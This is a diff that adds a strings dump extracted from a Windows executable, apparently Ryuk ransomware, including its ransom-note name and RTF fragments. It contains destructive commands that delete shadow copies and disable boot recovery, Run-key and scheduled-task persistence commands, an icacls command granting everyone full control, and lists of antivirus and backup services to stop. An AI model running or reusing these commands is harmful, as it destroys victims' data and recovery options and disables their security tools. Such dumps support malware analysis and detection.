@@ -1,0 +1,575 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.gfids
+8SVW`2
+QSVW`f
+SVW`Sf
+8SVW`2
+QSVW`2
+`SVW`f
+,SVW`f
+5jdhHj
+URPQQh
+;t$,v-
+UQPXY]Y[
+t#Vhxj
+j"^f91j\^u8
+j"^f9q
+t/j=[f;
+PPPPPWS
+PP9E u:PPVWP
+taj*Xf
+VWj\^j:
+WWWPWS
+SSVWh 
+f9:t!V
+QQSWj0j@
+PPPPPPPP
+-.uW-.u
+0123456789
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+5__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.gfids$x
+.gfids$y
+GetProcAddress
+GetCurrentProcess
+GetCurrentThread
+SetLastError
+CloseHandle
+WinExec
+LoadLibraryA
+KERNEL32.dll
+CloseServiceHandle
+ADVAPI32.dll
+WS2_32.dll
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+RtlUnwind
+GetLastError
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+LoadLibraryExW
+ExitProcess
+GetModuleHandleExW
+GetStdHandle
+WriteFile
+GetModuleFileNameW
+MultiByteToWideChar
+WideCharToMultiByte
+GetACP
+HeapFree
+HeapAlloc
+GetStringTypeW
+LCMapStringW
+FindClose
+FindFirstFileExW
+FindNextFileW
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+GetFileType
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+CreateFileW
+RaiseException
+$WGetCurrentProcess
+IcmpCloseHandle
+SetFileAttributesW
+GetAdaptersAddresses
+RegOpenKeyExW
+GetLogicalDrives
+GetLastError
+setsockopt
+closesocket
+GetFileAttributesW
+\users\Public\
+OpenProcessToken
+OpenProcess
+VirtualAllocEx
+NtQueryInformationProcess
+cmd.exe /c "WMIC.exe shadowcopy delete"
+CryptDecrypt
+Microsoft Enhanced RSA and AES Cryptographic Provider
+VirtualAlloc
+InstallLanguage
+SeDebugPrivilege
+RegSetValueExW
+Ntdll.dll
+HERMES
+CryptGenKey
+SYSTEM\CurrentControlSet\Control\Nls\Language\
+GetVersionExW
+IcmpCreateFile
+CreateDirectoryW
+VirtualFree
+Process32NextW
+Shell32.dll
+sendto
+EnableLUA
+CopyFileA
+cmd.exe /c "vssadmin.exe Delete Shadows /all /quiet"
+Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
+EnumServicesStatusW
+ShellExecuteW
+GetModuleFileNameA
+HERMES
+CryptDeriveKey
+inet_ntop
+ole32.dll
+CloseHandle
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
+GetTempPathW
+LookupPrivilegeValueW
+CryptExportKey
+SetFileAttributesA
+GetTickCount
+FindClose
+inet_addr
+cmd.exe /c "bcdedit /set {default} recoveryenabled No & bcdedit /set {default}"
+CommandLineToArgvW
+CryptEncrypt
+Ntdll.dll
+Ws2_32.dll
+GetModuleFileNameW
+SetFilePointerEx
+" /TR "C:\Windows\System32\cmd.exe /c for /l %x in (1,1,50) do start wordpad.exe /p 
+AdjustTokenPrivileges
+volume_a
+CreateThread
+WNetCloseEnum
+explorer.exe
+WinExec
+LookupAccountSidW
+sysrep
+OpenThreadToken
+GetFileAttributesA
+CreateFileA
+0123456789abcdef
+CryptDestroyKey
+lsaas.exe
+CreateProcessA
+icacls "
+{\rtf1\ansi\ansicpg1252\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Times New Roman;}{\f1\fnil\fcharset0 Calibri;}}
+{\*\generator Riched20 10.0.14393}\viewkind4\uc1 
+\pard\ri-1782\sa200\sl276\slmult1\b\f0\fs34\lang9\par
+Wow64RevertWow64FsRedirection
+encrypt
+GetCommandLineW
+RegQueryValueExA
+RyukReadMe.html
+socket
+CoCreateInstance
+advapi32.dll
+DeleteFileW
+IcmpSendEcho
+FindNextFileW
+NtQueryInformationProcess
+LoadLibraryW
+Wow64DisableWow64FsRedirection
+GetSystemDefaultLangID
+CreateToolhelp32Snapshot
+Microsoft Base Cryptographic Provider v1.0
+GetStartupInfoW
+ReadFile
+GetFileSizeEx
+\pard\sa200\sl276\slmult1\b0\fs54\par
+\pard\sa200\sl276\slmult1\qc\f1\fs52\par
+\b\f0\fs140 Ryuk\b0\f1\fs52\par
+\fs22\par
+\pard\sa200\sl276\slmult1\qr\b\f0\fs42\par
+\pard\ri-1782\sa200\sl276\slmult1\qr     \par
+\pard\ri-1782\sa200\sl240\slmult1\qr\fs34 balance of shadow universe\b0\f1\fs22\par
+GetTokenInformation
+FindFirstFileW
+MoveFileExW
+GetUserNameW
+CryptAcquireContextW
+GetDriveTypeW
+WNetEnumResourceW
+RegDeleteValueW
+GetFileSize
+WNetOpenEnumW
+WSAStartup
+CreateRemoteThread
+WriteFile
+RegOpenKeyExA
+VirtualFreeEx
+Process32FirstW
+Iphlpapi.dll
+mpr.dll
+RegCloseKey
+GetWindowsDirectoryW
+Kernel32.dll
+GetModuleHandleA
+SCHTASKS /CREATE /NP /SC DAILY /TN "Print
+C:\Windows\System32\cmd.exe
+GlobalAlloc
+ShellExecuteA
+LoadLibraryA
+CreateFileW
+CreateProcessW
+WNetEnumResourceA
+OpenSCManagerW
+FreeLibrary
+ExitProcess
+CopyFileW
+ConvertIpv4MaskToLength
+lan.exe
+WaitForMultipleObjects
+InetNtopW
+" /grant Everyone:F /T /C /Q
+WNetOpenEnumA
+SeBackupPrivilege
+CryptImportKey
+" /ST 
+GetIpNetTable
+GetProcAddress
+CoInitialize
+csrss.exe
+sysvol
+SetFilePointer
+WriteProcessMemory
+netlogon
+GetUserNameA
+WSACleanup
+SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
+cmd.exe /c "bootstatuspolicy ignoreallfailures"
+ImpersonateSelf
+31264879:9accffh
+Picuovphv Bbsg!Es|rwojrarkkd Stryjfes x4.3
+Ddvdpl440dlm
+FrystDdswirfCqovf{vD
+FrystFsgcteIaui
+FrystKbujDaua
+FrystGfuvrozHctj
+FrystUfngasfCqovf{v
+FrystJfvJasiPcscn
+U}6NYfJPuyqKmWxOwvkiLnkhWhVxmEhdcMpbJCvYuefwVqRqohpliVlWZOXHGyUsKSPCRQBOoFhAmMcUjOstkiORWqs
+advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+         (((((                  H
+      (                          
+         (((((                  H
+api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+virtual
+vmcomp
+backup
+Backup
+xchange
+encsvc
+firefoxconfig
+infopath
+msaccess
+mydesktop
+ocautoupds
+onenote
+oracle
+outlook
+powerpnt
+sqbcoreservice
+synctime
+tbirdconfig
+thebat
+thunderbird
+xfssvccon
+tmlisten
+PccNTMon
+CNTAoSMgr
+Ntrtscan
+mbamtray
+vmcomp
+xchange
+acronis
+Enterprise
+Sophos
+AcrSch
+Antivirus
+Antivirus
+DCAgent
+EPSecurity
+EPUpdate
+Eraser
+EsgShKernel
+FA_Scheduler
+IISAdmin
+Endpoint
+McShield
+mfemms
+mfevtp
+Exchange
+Report
+sacsvr
+SAVAdmin
+SDRSVC
+SepMaster
+Monitor
+Smcinst
+SmcService
+TrueKey
+tmlisten
+UI0Detect
+NetMsmq
+EhttpSrv
+ESHASRV
+klnagent
+wbengine
+mfefire
+bootmgr
+NTDETECT
+\Documents and Settings\Default User\sys
+taskkill
+DEL /F 
+encrypt
+tMicrosoft Enhanced RSA and AES Cryptographic Provider (Prototype)
+/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "EV" /t REG_SZ /d "
+\Windows\
+WINDOWS
+\users\Public\sys
+Windows
+Chrome
+\System32\cmd.exe
+sC5OSmyyW
+Mozilla
+Microsoft Enhanced RSA and AES Cryptographic Provider
+sysvol
+netlogon
+ explorer.exe
+W/C REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "EV" /f
+W /reg:64
+e\Documents and Settings\Default User\
+lan.exe
+s\users\Public\
+RyukReadMe.html
+SYSVOL
+stop "
+lsaas.exe
+Ncsrss.exe
